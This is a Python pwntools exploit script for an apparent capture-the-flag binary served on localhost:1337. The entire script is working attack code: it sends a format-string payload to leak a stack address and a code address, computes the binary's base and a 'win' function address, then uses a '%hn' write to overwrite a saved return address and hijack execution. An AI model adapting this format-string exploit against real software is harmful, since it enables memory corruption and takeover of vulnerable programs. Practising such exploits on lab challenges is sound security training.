from pwn import *

# Context
context.binary = './challenge'
context.log_level = 'info'

def solve():
    if args.REMOTE:
        p = remote('localhost', 1337)
    else:
        p = process('./challenge')


    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b'Transmit data: ')
    
  
    p.sendline(b'%1$p %25$p')
    
    p.recvuntil(b'The archives echo back: ')
    leaks = p.recvline().strip().split()
    
    buf_addr = int(leaks[0], 16)
    main_leak = int(leaks[1], 16)
    
    print(f"Buf Address: {hex(buf_addr)}")
    print(f"Main Leak: {hex(main_leak)}")
    
    base_addr = main_leak - 0x10e0
    win_addr = base_addr + 0x1380 
    
    print(f"Base Address: {hex(base_addr)}")
    print(f"Win Address: {hex(win_addr)}")
    
    target_addr = buf_addr - 0x10
    
    val_to_write = win_addr & 0xFFFF
    

    
    part1 = f"%{val_to_write}c%10$hn".encode()
    padding = b'A' * (16 - len(part1))
    payload = part1 + padding + p64(target_addr)
    
    p.sendline(payload)

    data = p.recvall(timeout=2)
    print(f"Data: {data}")

if __name__ == "__main__":
    solve()
